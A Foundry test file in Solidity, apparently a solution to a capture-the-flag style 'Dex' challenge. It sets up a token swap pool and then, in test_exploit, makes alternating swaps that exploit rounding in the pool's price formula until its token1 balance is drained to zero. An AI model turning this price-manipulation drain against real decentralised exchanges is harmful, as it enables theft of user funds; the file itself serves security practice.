// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Test, console} from "forge-std/Test.sol";
import {Dex, SwappableToken} from "../src/Dex.sol";

contract DexTest is Test {
    Dex public dex;
    SwappableToken public _token1;
    SwappableToken public _token2;
    address token1; 
    address token2;
    address user = makeAddr("user");
    uint256 public INITIAL_SUPPLY = 110;
    uint256 public LIQUIDITY_AMOUNT = 100;

    function setUp() public {
        dex = new Dex();
        _token1 = new SwappableToken(address(dex), "TOKEN1", "T1", INITIAL_SUPPLY);
        _token2 = new SwappableToken(address(dex), "TOKEN2", "T2", INITIAL_SUPPLY);
        dex.setTokens(address(_token1), address(_token2));
        dex.approve(address(dex), type(uint256).max);

        token1 = dex.token1();
        token2 = dex.token2();

        dex.addLiquidity(token1, LIQUIDITY_AMOUNT);
        dex.addLiquidity(token2, LIQUIDITY_AMOUNT);
    }

     function test_exploit() public {
        dex.swap(token1, token2, 10);
        console.log(dex.balanceOf(token1, address(dex)));
        dex.swap(token2, token1, 20);
        console.log(dex.balanceOf(token1, address(dex)));
        dex.swap(token1, token2, 24);
        console.log(dex.balanceOf(token1, address(dex)));
        dex.swap(token2, token1, 30);
        console.log(dex.balanceOf(token1, address(dex)));
        dex.swap(token1, token2, 41);
        console.log(dex.balanceOf(token1, address(dex)));
        dex.swap(token2, token1, 45);
        console.log(dex.balanceOf(token1, address(dex)));

        // token1 balance drained from dex
        assertEq(dex.balanceOf(token1, address(dex)), 0);
    }
}
